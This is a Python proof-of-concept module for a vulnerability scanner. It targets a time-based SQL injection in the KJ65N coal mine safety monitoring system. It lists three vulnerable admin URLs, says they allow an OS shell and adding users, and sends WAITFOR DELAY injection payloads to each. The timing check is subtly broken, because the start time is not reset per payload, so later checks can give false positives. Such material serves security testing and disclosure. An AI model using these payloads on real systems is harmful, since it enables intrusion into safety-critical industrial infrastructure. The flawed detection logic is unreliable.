# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urllib.parse
import time


class Vuln(ABVuln):
    vuln_id = 'KJ65N_0002'  # 平台漏洞编号，留空
    name = 'KJ65N煤矿安全监控系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-10-27'  # 漏洞公布时间
    desc = '''
        KJ65N煤矿远程监控安全预警系统 通用sql注入3处(可直接os-shell 添加用户)。
        /admin/groupEdit.asp?groupId=
        /admin/groupCollieryEdit.asp?groupId=
        /admin/userEdit.asp?userId=
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'KJ65N煤矿安全监控系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'db1688a7-6b36-43df-b9ab-b5fb0ccb531d'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-28'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer：WooYun-2015-131730    WooYun-2015-149526 工控系列
            hh = hackhttp.hackhttp()
            arg = self.target
            start_time1 = time.time()
            code1, head, res, errcode, _ = hh.http(arg)
            true_time = time.time() - start_time1
            start_time2 = time.time()

            payloads = (
                "/admin/groupEdit.asp?groupId=1%20waitfor%20delay%20'0:0:5'--",
                "/admin/groupCollieryEdit.asp?groupId=%20waitfor%20delay%20'0:0:5'--",
                "/admin/userEdit.asp?userId=123';WAITFOR%20DELAY%20'0:0:5'--")
            for p in payloads:
                url = arg + p
                code2, head, res, errcode, _ = hh.http(url)
                flase_time = time.time() - start_time2
                if code1 == 200 and code2 == 200 and true_time < 2 and flase_time > 5:
                    # security_hole(url)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
